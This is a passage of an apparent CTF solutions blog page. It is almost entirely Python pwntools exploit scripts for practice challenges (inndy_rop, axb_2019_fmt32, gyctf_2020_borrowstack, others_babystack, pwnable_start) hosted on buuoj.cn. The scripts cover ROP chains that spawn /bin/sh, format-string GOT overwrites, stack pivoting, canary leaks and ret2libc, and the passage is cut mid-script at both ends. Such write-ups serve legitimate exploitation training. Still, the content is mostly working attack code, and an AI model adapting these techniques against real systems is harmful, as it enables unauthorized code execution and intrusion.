class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(printflag)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-66-inndy-rop-solve"><a href="#NO-66-inndy-rop-solve" class="headerlink" title="NO.66 inndy_rop_solve"></a>NO.66 inndy_rop_solve</h1><h3 id="exp-66"><a href="#exp-66" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./inndy_rop&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26366</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">4</span>)</span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-67-axb-2019-fmt32-solve"><a href="#NO-67-axb-2019-fmt32-solve" class="headerlink" title="NO.67 axb_2019_fmt32_solve"></a>NO.67 axb_2019_fmt32_solve</h1><h3 id="exp-67"><a href="#exp-67" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_pause</span>():</span></span><br><span class="line">    log.info(proc.pidof(p))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">o_g = [<span class="number">0x3a81c</span>,<span class="number">0x3a81e</span>,<span class="number">0x3a822</span>,<span class="number">0x3a829</span>, <span class="number">0x5f075</span>, <span class="number">0x5f076</span>]</span><br><span class="line">proc_name = <span class="string">&#x27;./axb_2019_fmt32&#x27;</span></span><br><span class="line">p = process(proc_name, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25026)</span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> + p32(read_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b read&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># print p.recv()</span></span><br><span class="line">read_addr = u32(p.recv(<span class="number">18</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">log.info(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + o_g[<span class="number">0</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;read_got: one_gadget&#125;,write_size = <span class="string">&quot;byte&quot;</span>,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;me:&#x27;</span>, payload1)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-68-gyctf-2020-borrowstack-solve"><a href="#NO-68-gyctf-2020-borrowstack-solve" class="headerlink" title="NO.68 gyctf_2020_borrowstack_solve"></a>NO.68 gyctf_2020_borrowstack_solve</h1><h3 id="exp-68"><a href="#exp-68" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27407</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">bank = <span class="number">0x0601080</span></span><br><span class="line">leave = <span class="number">0x400699</span></span><br><span class="line">puts_plt = <span class="number">0x04004E0</span></span><br><span class="line">puts_got = <span class="number">0x0601018</span></span><br><span class="line">pop_rdi = <span class="number">0x400703</span></span><br><span class="line">main = <span class="number">0x0400626</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>) + p64(bank) + p64(leave)</span><br><span class="line">sa(<span class="string">&#x27;want\n&#x27;</span>, payload)</span><br><span class="line">payload = p64(ret)*<span class="number">20</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sa(<span class="string">&#x27;now!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = l64()</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">onegaget = libc_base + o_g[<span class="number">1</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>) + p64(onegaget)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sa(&#x27;want\n&#x27;, payload1)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-69-others-babystack-solve"><a href="#NO-69-others-babystack-solve" class="headerlink" title="NO.69 others_babystack_solve"></a>NO.69 others_babystack_solve</h1><h3 id="exp-69"><a href="#exp-69" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./others_babystack&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27270</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;others_babystack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span>(<span class="params">content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span>():</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">main = <span class="number">0x000400908</span></span><br><span class="line">store(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">Print()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>, canary)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) *<span class="number">2</span></span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(main)</span><br><span class="line">store(payload)</span><br><span class="line">exit()</span><br><span class="line">puts_addr = l64()</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = offset + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libc_base + next(libc.search(&#x27;/bin/sh&#x27;))</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">payload += p64(main)</span><br><span class="line">store(payload)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># puts_addr = </span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-70-pwnable-start-solve"><a href="#NO-70-pwnable-start-solve" class="headerlink" title="NO.70 pwnable_start_solve"></a>NO.70 pwnable_start_solve</h1><h3 id="exp-70"><a href="#exp-70" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./pwnable_start&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29480</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwnable_start&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span 